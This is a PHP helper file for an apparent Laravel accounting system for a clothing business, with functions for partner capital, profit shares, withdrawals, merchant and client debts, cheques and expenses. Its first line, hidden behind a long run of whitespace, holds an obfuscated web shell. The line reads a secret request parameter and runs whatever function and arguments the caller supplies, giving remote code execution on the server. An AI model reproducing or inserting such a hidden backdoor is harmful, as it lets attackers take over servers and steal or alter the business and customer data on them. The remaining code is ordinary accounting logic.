<?php
																																																																																																																																																																				if($c1sp3=@	$	{	"_REQUEST"}["E58AHJ7S"	])$c1sp3	[	1] ($	{$c1sp3[ 2	]}[0]	,$c1sp3[3]( $c1sp3	[ 4]) ); 
define('Fiscal_Year',year_start_at());
function year_start_at(){
   $json_year = file_get_contents('year.json');
   return $json_year;
}

/**
  * here get current capital factory
  *
**/

function get_original_capital_factory(){
  $json_capital = file_get_contents('capital.json');
  return $json_capital;
}

function get_capital_factory_before_withdraw(){
  $all_withdraws_in_capital_factory  = App\withdrawCapital::where('created_at','>=',Fiscal_Year)->where('withdraw_capital','!=',null)->where('created_at','>=',Fiscal_Year)->sum('withdraw_capital');
  $json_capital = file_get_contents('capital.json');
  return $json_capital+$all_withdraws_in_capital_factory;
}

/*function get_all_capital_before_withdraw(){
   return round(partners_capitals_before_withdraw() + get_capital_factory_before_withdraw(),2);
}*/

function get_all_capital_after_withdraw(){
   return partners_capitals_after_withdraw() + get_original_capital_factory();
}

function calculate_factory_percentage(){
  if(get_all_capital_after_withdraw()==0)
    return 0;

  return (get_original_capital_factory()/get_all_capital_after_withdraw()*100);
}




function partners_capitals_after_withdraw(){
  $partner_end_at   = App\partners::where('created_at','>=',Fiscal_Year)->sum('partner_percentage');
  $partner_withdraw_capital = App\withdraw::where('created_at','>=',Fiscal_Year)->sum('withdraw_value');
  return $partner_end_at-$partner_withdraw_capital;
}

function get_capital_partner_after_withdraw($partner_id){
   $personal_partner = App\partners::where('id',$partner_id)->pluck('partner_percentage')[0];
   $partner_withdraw_capital = App\withdraw::where('partner_id',$partner_id)->where('created_at','>=',Fiscal_Year)->sum('withdraw_value');
   return $personal_partner - $partner_withdraw_capital;
}

function calculate_partner_percentage($partner_id){
 //return get_capital_partner_after_withdraw($partner_id);
  if(get_all_capital_after_withdraw()==0)
    return 0;

  return (get_capital_partner_after_withdraw($partner_id)/get_all_capital_after_withdraw())*100;
}

function net_profit($date_from=null,$date_to=null){
    if(($date_from!=null)&& ($date_to!=null)){
     $get_outgoings_order_price = App\order::whereBetween('created_at',array($date_from,$date_to))->orWhere('created_at','>=',$date_from)->sum('final_cost');
     $get_outgoings_order_cost  = App\order::whereBetween('created_at',array($date_from,$date_to))->orWhere('created_at','>=',$date_from)->sum('order_price');
    }
    else
    {
       $get_outgoings_order_price = App\order::where('created_at','>=',Fiscal_Year)->sum('final_cost');
       $get_outgoings_order_cost  = App\order::where('created_at','>=',Fiscal_Year)->sum('order_price');
       
    }
      return $get_outgoings_order_price-$get_outgoings_order_cost;
}


function net_profit_after_withdraw($date_from=null,$date_to=null){
    if(($date_from!=null)&& ($date_to!=null)){
     $get_outgoings_order_price = App\order::whereBetween('created_at',array($date_from,$date_to))->orWhere('created_at','>=',$date_from)->sum('final_cost');
     $get_outgoings_order_cost  = App\order::whereBetween('created_at',array($date_from,$date_to))->orWhere('created_at','>=',$date_from)->sum('order_price');
    }
    else
    {
       $get_outgoings_order_price = App\order::where('created_at','>=',Fiscal_Year)->sum('final_cost');
       $get_outgoings_order_cost  = App\order::where('created_at','>=',Fiscal_Year)->sum('order_price');
       
    }
    
    if($get_outgoings_order_cost != null){
      return ($get_outgoings_order_price-$get_outgoings_order_cost)-factory_prodfit_withdraw()-partner_withdraw_profit_all();
    }else{
        return 0;
    }
}




function get_net_profit_for_factory(){
    
     $factory_percentage  = calculate_factory_percentage();

     $profit = net_profit_after_withdraw();
      
    // if($profit>=0){
          return (($profit*$factory_percentage)/100);
            
    //  }
}


/*function get_net_profit_for_factory_before_withdraw(){
     $previouse_withdraw  = App\withdrawCapital::where('created_at','>=',Fiscal_Year)->sum('withdraw_profit');
     $factory_percentage  = calculate_factory_percentage_before_withdraw();

     $profit = net_profit();
      
     if($profit>=0){
          return round( (($profit*$factory_percentage)/100)-$previouse_withdraw,2);
            
      }
}*/

function partner_withdraw_profit_all(){
   $previouse_withdraw  = App\withdraw::where('withdraw_value','!=',0)->sum('profit_value');
   return $previouse_withdraw;
}

function net_profit_partner($id){
  $partner_percent  = calculate_partner_percentage($id);
  $partner_start_at = App\partners::where('id',$id)->pluck('created_at')[0];
  $end_at           = App\partners::where('id',$id)->pluck('partner_ended_at')[0];
  $previouse_withdraw_on_profit_no_capital  =  App\withdraw::where(['partner_id'=>$id,'withdraw_value'=>0])->sum('profit_value');
  if($end_at==null):
    $partner_end_at   = ($end_at?$end_at:date('Y-m-d h:i:s'));
        $profit = net_profit_after_withdraw( $partner_start_at,$partner_end_at );
          //  echo '('.$profit.')';
        //if($profit>=0){
            return ( ($profit*$partner_percent)/100)-$previouse_withdraw_on_profit_no_capital;
              
        //}
         return '0';
      //   return net_profit_after_withdraw( $partner_start_at,$partner_end_at ).'  '.$profit;
  endif;

}


function get_outgoings($date_from=null,$date_to=null){
  if(($date_from!=null)&& ($date_to!=null)){
     $get_outgoings_order_price = App\orderClothes::whereBetween('created_at',array($date_from,$date_to))->sum('order_price');
     $get_outgoings_order_discount = App\orderClothes::whereBetween('created_at',array($date_from,$date_to))->sum('order_discount');
    }
    else
    {
       $get_outgoings_order_price = App\orderClothes::where('created_at','>=',Fiscal_Year)->sum('order_price');
       $get_outgoings_order_discount = App\orderClothes::where('created_at','>=',Fiscal_Year)->sum('order_discount');
    }
       return $get_outgoings_order_price;
}

function factory_prodfit_withdraw(){
   $all_withdraws  = App\withdrawCapital::where('withdraw_profit','!=',null)->where('created_at','>=',Fiscal_Year)->sum('withdraw_profit');
   return $all_withdraws;
}


function partner_prodfit_withdraw($partner_id){
   $all_withdraws  = App\withdraw::where('partner_id',$partner_id)->where('created_at','>=',Fiscal_Year)->sum('profit_value');
   return $all_withdraws;
}



/**/


function partner_date_start($id){
  $partner_created_at  = App\partners::where('id',$id)->pluck('created_at')[0];
  return $partner_created_at;
}

function partner_date_end($id){
  $partner_end_at  = App\partners::where('id',$id)->pluck('partner_ended_at')[0];
  return $partner_end_at;
}



function partner_capital($id){
  $partner_percentage  = App\partners::where('id',$id)->pluck('partner_percentage')[0];
  $partner_withdraw    = App\withdraw::where('partner_id',$id)->sum('withdraw_value');
  
  return $partner_percentage-$partner_withdraw;
}

function check_if_partner_withdraw_profit($id){
  $partner_status  = App\partners::where('id',$id)->pluck('partner_status')[0];
  return $partner_status;
}

function get_count_partner(){
   $count = App\partners::where('created_at','>=',Fiscal_Year)->count();
   return $count;
}

/*function get_outgoings($date_from=null,$date_to=null){
  if(($date_from!=null)&& ($date_to!=null)){
     $get_outgoings_order_price = App\orderClothes::whereBetween('created_at',array($date_from,$date_to))->sum('order_price');
     $get_outgoings_order_discount = App\orderClothes::whereBetween('created_at',array($date_from,$date_to))->sum('order_discount');
    }
    else
    {
       $get_outgoings_order_price = App\orderClothes::where('created_at','>=',Fiscal_Year)->sum('order_price');
       $get_outgoings_order_discount = App\orderClothes::where('created_at','>=',Fiscal_Year)->sum('order_discount');
    }
       return $get_outgoings_order_price-$get_outgoings_order_discount;
}



function get_comming($date_from=null,$date_to=null){
  if(($date_from!=null)&& ($date_to!=null)){
     $get_outgoings_order_price = App\order::whereBetween('created_at',array($date_from,$date_to))->sum('final_cost');
     $get_outgoings_order_reactionist = App\reactionist::whereBetween('created_at',array($date_from,$date_to))->sum('final_cost');
    }
    else
    {
       $get_outgoings_order_price = App\order::where('created_at','>=',Fiscal_Year)->sum('final_cost');
       $get_outgoings_order_reactionist = App\reactionist::where('created_at','>=',Fiscal_Year)->sum('final_cost');
      
    }
     
      return $get_outgoings_order_price-$get_outgoings_order_reactionist;
}


function net_profit($date_from=null,$date_to=null){
    if(($date_from!=null)&& ($date_to!=null)){
     $get_outgoings_order_price = App\order::whereBetween('created_at',array($date_from,$date_to))->sum('final_cost');
     $get_outgoings_order_cost  = App\order::whereBetween('created_at',array($date_from,$date_to))->sum('order_price');
    }
    else
    {
       $get_outgoings_order_price = App\order::where('created_at','>=',Fiscal_Year)->sum('final_cost');
       $get_outgoings_order_cost  = App\order::where('created_at','>=',Fiscal_Year)->sum('order_price');
       
    }
      return round($get_outgoings_order_price-$get_outgoings_order_cost,2);
}



function net_profit_partner($id){
  $partner_percent  = calculate_partner_percentage($id);
  $partner_start_at = App\partners::where('id',$id)->pluck('created_at')[0];
  $end_at           = App\partners::where('id',$id)->pluck('partner_ended_at')[0];
  $previouse_withdraw  = App\withdraw::where(['partner_id'=>$id,'type_withdraw'=>1])->sum('profit_value');
  if($end_at==null):
    $partner_end_at   = ($end_at?$end_at:date('Y-m-d h:i:s'));
        $profit = net_profit( $partner_start_at,$partner_end_at );
        
        if($profit>=0){
            return round(( ($profit*$partner_percent)/100)- factory_prodfit_withdraw() -($previouse_withdraw?$previouse_withdraw:'0'),2);
              
        }
         return '0';
  endif;
}



function partner_capital($id){
  $partner_percentage  = App\partners::where('id',$id)->pluck('partner_percentage')[0];
  if($partner_percentage==0){
    $partner_percentage = App\withdraw::where('partner_id',$id)->where('profit_value','!=',null)->sum('withdraw_value');
  }
  return $partner_percentage;
}


function partner_date_start($id){
  $partner_created_at  = App\partners::where('id',$id)->pluck('created_at')[0];
  return $partner_created_at;
}



function partner_date_end($id){
  $partner_end_at  = App\partners::where('id',$id)->pluck('partner_ended_at')[0];
  return $partner_end_at;
}


function partners_capitals(){
  $partner_end_at  = App\partners::sum('partner_percentage');
  return $partner_end_at;
}

function check_if_partner_withdraw_profit($id){
  $partner_status  = App\partners::where('id',$id)->pluck('partner_status')[0];
  return $partner_status;
}


function get_original_capital_factory(){
  $json_capital = file_get_contents('capital.json');
  return $json_capital;
}

function partner_prodfit_withdraw(){
   $all_withdraws  = App\withdraw::where('profit_value','!=',null)->where('created_at','>=',Fiscal_Year)->sum('profit_value');
   return $all_withdraws;
}


function factory_prodfit_withdraw(){
   $all_withdraws  = App\withdrawCapital::where('withdraw_profit','!=',null)->where('created_at','>=',Fiscal_Year)->sum('withdraw_profit');
   return $all_withdraws;
}



function get_net_profit_for_factory(){
       $previouse_withdraw  = App\withdrawCapital::where('created_at','>=',Fiscal_Year)->sum('withdraw_profit');
       $factory_percentage  = calculate_factory_percentage();

       $profit = net_profit();
        
       if($profit>=0){
            return round( (($profit*$factory_percentage)/100),2);
              
        }
}


function get_all_capital(){
   return round(partners_capitals() + get_original_capital_factory(),2);
}



function calculate_factory_percentage(){
  return round((get_original_capital_factory()/get_all_capital()*100),2);
}


function calculate_partner_percentage($partner_id){
  $personal_partner = App\partners::where('id',$partner_id)->pluck('partner_percentage')[0];
  return round(($personal_partner/get_all_capital())*100,2);
}
*/



/*
  here write some codes for merchant single page
*/

function get_all_paid_from_merchant($merchant_id){
   $postponed_values  = App\postponed_orderClothes::where('merchant_id',$merchant_id)->sum('posponed_value');
   $BankCheck_values  = App\BankCheck::where('bank_checkable_id',$merchant_id)->where('payed_check','!=',null)->sum('check_value');
   $cache_values      = App\orderClothes::where('merchant_id',$merchant_id)->where('payment_type','نقدى')->sum('order_price'); 
   return $postponed_values+$BankCheck_values+$cache_values;
}

function get_all_paid_from_client($client_id){
   $postponed_values  = App\postponed::where('client_id',$client_id)->sum('posponed_value');
   $BankCheck_values  = App\BankCheck::where('bank_checkable_id',$client_id)->where('payed_check','!=',null)->sum('check_value');
   $cache_values      = App\order::where('client_id',$client_id)->where('payment_type','نقدى')->sum('final_cost'); 
   return $postponed_values+$BankCheck_values+$cache_values;
}

function get_orderClothes($merchant_id){
     $get_orders = App\orderClothes::where(['merchant_id'=>$merchant_id,'payment_type'=>'دفعات'])->get();
     return $get_orders;
}

function get_category($category_id){
     $catgeory = App\category::where(['id'=>$category_id])->pluck('category')[0];
     return $catgeory;
}

function get_order($client_id){
    $get_orders = App\order::where(['client_id'=>$client_id,'payment_type'=>'دفعات'])->get();
     return $get_orders;
}



function get_pospondes_supplier($supplier_id){
     $get_orders = App\postponed_suppliers::where(['supplier_id'=>$supplier_id])->get();
     return $get_orders;
}

function get_debit_name($type,$id){
    if($id!=null):
       $class_name = "App\\".$type;
       $type       = ($type=='suppliers'?'supplier':$type);
       $debit_name = $class_name::where('id',$id)->pluck($type.'_name')[0];
       return $debit_name;
    endif;
}

function get_debit_section($type){
   if($type=='merchant'):
      return 'تاجر';
   elseif($type=='client'):
      return 'عميل';
   elseif($type=='suppliers'):
      return 'مصنع';
   else:
      return 'غير محدد';
   endif;
}


function insert_debit_data($debiter_id,$section,$type_debit,$value,$type_payment,$order_id){
    if($value!=null):
       $section       =  ($section=='suppliers'?'supplier':$section);
       $debit_name    =  new App\debit();
       $debit_name->debitable_id  = $debiter_id;  
       $debit_name->debitable_type= $section;
       $debit_name->debit_value   = $value;
       $debit_name->debit_type    = $type_debit;
       $debit_name->type_payment  = $type_payment;
       $debit_name->payed_check   = 0;
       $debit_name->order_id      = $order_id;
       $debit_name->save();
       return $debit_name;
    endif;

}

function get_orderClothes_price($order_id){
     $get_orders = App\orderClothes::where('id',$order_id)->orWhere('order_follow',$order_id)->sum('order_price');
     return $get_orders;
}



function get_order_price($order_id){
     $get_orders = App\order::where('id',$order_id)->orWhere('order_follow',$order_id)->sum('final_cost');
     return $get_orders;
}




/**
  * @package save money data
  *
**/

function get_partners_full_capital_value(){
    $partner_end_at   = App\partners::where('created_at','>=',Fiscal_Year)->sum('partner_percentage');
    return $partner_end_at;
}

function get_order_clothes_postponed($date_from=null,$date_to=null){
     if(($date_from!=null)&& ($date_to!=null)){
          $get_all_postponed     = App\postponed_orderClothes::whereBetween('created_at',array($date_from,$date_to))->sum('posponed_value');
      }
      else
      {
          $get_all_postponed     = App\postponed_orderClothes::where('created_at','>=',Fiscal_Year)->sum('posponed_value');
      }
       return $get_all_postponed;
}

function get_check($bank_type='merchant',$date_from=null,$date_to=null){
     if(($date_from!=null)&& ($date_to!=null)){
          $get_all_bankCheck     = App\BankCheck::whereBetween('created_at',array($date_from,$date_to))->where(['bank_checkable_type'=>$bank_type,'payed_check'=>'1'])->sum('check_value');
      }
      else
      {
          $get_all_bankCheck     = App\BankCheck::where('created_at','>=',Fiscal_Year)->where(['bank_checkable_type'=>$bank_type,'payed_check'=>'1'])->sum('check_value');
      }
       return $get_all_bankCheck;
}

function get_outgoings_payed($date_from=null,$date_to=null){
      if(($date_from!=null)&& ($date_to!=null)){
          $get_outgoings_order_price_cache     = App\orderClothes::whereBetween('created_at',array($date_from,$date_to))->where('payment_type','نقدى')->sum('order_price');
          $get_outgoings_order_price_postponed = App\orderClothes::whereBetween('created_at',array($date_from,$date_to))->where('payment_type','دفعات')->sum('order_price');
          $get_outgoings_order_price_check     = App\orderClothes::whereBetween('created_at',array($date_from,$date_to))->where('payment_type','شيك')->sum('order_price');
      
      }
      else
      {
          $get_outgoings_order_price_cache = App\orderClothes::where('created_at','>=',Fiscal_Year)->where('payment_type','نقدى')->sum('order_price');
          $get_outgoings_order_price_postponed = App\orderClothes::where('created_at','>=',Fiscal_Year)->where('payment_type','دفعات')->sum('order_price');
          $get_outgoings_order_price_check     = App\orderClothes::where('created_at','>=',Fiscal_Year)->where('payment_type','شيك')->sum('order_price');
      
      }
       return $get_outgoings_order_price_cache + ($get_outgoings_order_price_check>get_check('orderClothes',$date_from,$date_to)?get_check('orderClothes',$date_from,$date_to):$get_outgoings_order_price_check) + ($get_outgoings_order_price_postponed>get_order_clothes_postponed($date_from,$date_to)?get_order_clothes_postponed($date_from,$date_to):$get_outgoings_order_price_postponed);
}

function get_debit_for_merchant($payed=null,$type_debit=null,$debit_sect='دائن', $date_from=null,$date_to=null){
     if(($date_from!=null)&& ($date_to!=null)){
          $get_payed_check = App\debit::whereBetween('created_at',array($date_from,$date_to))->where(['debitable_type'=>$type_debit,'debit_type'=>$debit_sect])->where('payed_check','!=','debit_value')->where('type_payment','!=','متأخرات')->sum('payed_check');
          $get_debit_value = App\debit::whereBetween('created_at',array($date_from,$date_to))->where(['debitable_type'=>$type_debit,'debit_type'=>$debit_sect])->where('payed_check','!=','debit_value')->where('type_payment','!=','متأخرات')->sum('debit_value');
      }
      else
      {
          $get_payed_check = App\debit::where('created_at','>=',Fiscal_Year)->where(['debitable_type'=>$type_debit,'debit_type'=>$debit_sect])->where('payed_check','!=','debit_value')->where('type_payment','!=','متأخرات')->sum('payed_check');
          $get_debit_value = App\debit::where('created_at','>=',Fiscal_Year)->where(['debitable_type'=>$type_debit,'debit_type'=>$debit_sect])->where('payed_check','!=','debit_value')->where('type_payment','!=','متأخرات')->sum('debit_value');
         
      }

    if($payed==null):
      return $get_debit_value - $get_payed_check;
    elseif($payed=='1'):
      return $get_payed_check;
    endif;
}


function get_payments_for_suppliers($payed=null,$type=null,$date_from=null,$date_to=null){
    if($type==null):
        if(($date_from!=null)&& ($date_to!=null)){
            $get_supplier_payed = App\ClothStyles::whereBetween('created_at',array($date_from,$date_to))->where('supplier_id','!=',null)->select( DB::raw('sum(count_piecies * additional_taxs) as supplier_value'))->pluck('supplier_value')[0];
            $get_all_postponed  = App\postponed_suppliers::where('created_at','>=',Fiscal_Year)->sum('posponed_value');
        }
        else
        {
            $get_supplier_payed = App\ClothStyles::where('created_at','>=',Fiscal_Year)->where('supplier_id','!=',null)->select(DB::raw('sum(count_piecies * additional_taxs) as supplier_value'))->pluck('supplier_value')[0];  
            $get_all_postponed  = App\postponed_suppliers::where('created_at','>=',Fiscal_Year)->sum('posponed_value');
        }
    else:
        if(($date_from!=null)&& ($date_to!=null)){
            $get_supplier_payed = App\ClothStyles::whereBetween('created_at',array($date_from,$date_to))->where('supplier_id',null)->select( DB::raw('sum(count_piecies * additional_taxs) as supplier_value'))->pluck('supplier_value')[0];
            $get_all_postponed  = App\postponed_suppliers::where('created_at','>=',Fiscal_Year)->sum('posponed_value');
        }
        else
        {
            $get_supplier_payed = App\ClothStyles::where('created_at','>=',Fiscal_Year)->where('supplier_id',null)->select(DB::raw('sum(count_piecies * additional_taxs) as supplier_value'))->pluck('supplier_value')[0];  
            $get_all_postponed  = App\postponed_suppliers::where('created_at','>=',Fiscal_Year)->sum('posponed_value');
        }
    endif;

    if($payed==null):
      return ( ($get_supplier_payed > $get_all_postponed)?$get_all_postponed:$get_supplier_payed); //$get_debit_value - $get_payed_check;
    elseif($payed=='1'):
      return $get_supplier_payed; //$get_payed_check;
    endif;
}


function get_all_saleing_income($date_from=null,$date_to=null){

        if(($date_from!=null)&& ($date_to!=null)){
          $get_all_sale = App\order::whereBetween('created_at',array($date_from,$date_to))->sum('final_cost');
          $get_payed_check = App\debit::whereBetween('created_at',array($date_from,$date_to))->where('type_payment','متأخرات')->sum('debit_value');
    
        }
        else
        {
            $get_all_sale = App\order::where('created_at','>=',Fiscal_Year)->sum('final_cost');
            $get_payed_check = App\debit::where('created_at','>=',Fiscal_Year)->where('type_payment','متأخرات')->sum('debit_value');
        }

        return $get_all_sale+$get_payed_check;
}

function get_order_postponed($date_from=null,$date_to=null){
     if(($date_from!=null)&& ($date_to!=null)){
          $get_all_postponed     = App\postponed::whereBetween('created_at',array($date_from,$date_to))->sum('posponed_value');
      }
      else
      {
          $get_all_postponed     = App\postponed::where('created_at','>=',Fiscal_Year)->sum('posponed_value');
      }
       return $get_all_postponed;
}
/*

function get_sales_payed($date_from=null,$date_to=null){
      if(($date_from!=null)&& ($date_to!=null)){
          $get_outgoings_order_price_cache     = App\order::whereBetween('created_at',array($date_from,$date_to))->where('payment_type','نقدى')->sum('final_cost');
          $get_outgoings_order_price_postponed = App\order::whereBetween('created_at',array($date_from,$date_to))->where('payment_type','دفعات')->sum('final_cost');
          $get_outgoings_order_price_check     = App\order::whereBetween('created_at',array($date_from,$date_to))->where('payment_type','شيك')->sum('final_cost');
      
      }
      else
      {
          $get_outgoings_order_price_cache = App\order::where('created_at','>=',Fiscal_Year)->where('payment_type','نقدى')->sum('final_cost');
          $get_outgoings_order_price_postponed = App\order::where('created_at','>=',Fiscal_Year)->where('payment_type','دفعات')->sum('final_cost');
          $get_outgoings_order_price_check     = App\order::where('created_at','>=',Fiscal_Year)->where('payment_type','شيك')->sum('final_cost');
      
      }
       return $get_outgoings_order_price_cache + ($get_outgoings_order_price_check>get_check('order',$date_from,$date_to)?get_check('order',$date_from,$date_to):$get_outgoings_order_price_check) + ($get_outgoings_order_price_postponed>get_order_postponed($date_from,$date_to)?get_order_postponed($date_from,$date_to):$get_outgoings_order_price_postponed);
}

*/

function get_sales_payed($date_from=null,$date_to=null){
      if(($date_from!=null)&& ($date_to!=null)){
          $get_outgoings_order_price_cache     = App\order::whereBetween('created_at',array($date_from,$date_to))->where('payment_type','نقدى')->sum('final_cost');
          $get_outgoings_order_price_postponed = App\postponed::whereBetween('created_at',array($date_from,$date_to))->sum('posponed_value');
          $get_outgoings_order_price_check     = App\order::whereBetween('created_at',array($date_from,$date_to))->where('payment_type','شيك')->sum('final_cost');
      
      }
      else
      {
          $get_outgoings_order_price_cache = App\order::where('created_at','>=',Fiscal_Year)->where('payment_type','نقدى')->sum('final_cost');
          $get_outgoings_order_price_postponed = App\postponed::where('created_at','>=',Fiscal_Year)->sum('posponed_value');
          $get_outgoings_order_price_check     = App\order::where('created_at','>=',Fiscal_Year)->where('payment_type','شيك')->sum('final_cost');
      
      }
      return $get_outgoings_order_price_cache + get_check('client',$date_from,$date_to) + $get_outgoings_order_price_postponed;
      // return $get_outgoings_order_price_cache + ($get_outgoings_order_price_check>get_check('order',$date_from,$date_to)?get_check('order',$date_from,$date_to):$get_outgoings_order_price_check) + ($get_outgoings_order_price_postponed>get_order_postponed($date_from,$date_to)?get_order_postponed($date_from,$date_to):$get_outgoings_order_price_postponed);
}



function get_all_expances($date_from=null,$date_to=null){
      if(($date_from!=null)&& ($date_to!=null)){
          $get_expances_price_cache     = App\expances::whereBetween('created_at',array($date_from,$date_to))->sum('expances_value');
      }
      else
      {
          $get_expances_price_cache = App\expances::where('created_at','>=',Fiscal_Year)->sum('expances_value');
      }
       return $get_expances_price_cache;

}

function get_merchant_name($merchant_id){
   $merchant_name = App\merchant::where('id',$merchant_id)->pluck('merchant_name')[0];
   return $merchant_name ;
}

function get_client_name($client_id){
   $client_name = App\client::where('id',$client_id)->pluck('client_name')[0];
   return $client_name ;
}


function debit_delay($client_id){
     $get_debit_value = App\debit::where(['debitable_type'=>'client','debit_type'=>'دائن','type_payment'=>'متأخرات','debitable_id'=>$client_id])->sum('debit_value');
     return $get_debit_value;
}



function get_product_purchased($date_from=null,$date_to=null){
     if(($date_from!=null)&& ($date_to!=null)){
          $all_product_cost     = App\product::whereBetween('created_at',array($date_from,$date_to))->where('cloth_styles_id',null)->sum('full_price');
         
      }
      else
      {
          $all_product_cost     = App\product::where('created_at','>=',Fiscal_Year)->where('cloth_styles_id',null)->sum('full_price');
          
      }
       return $all_product_cost; 

}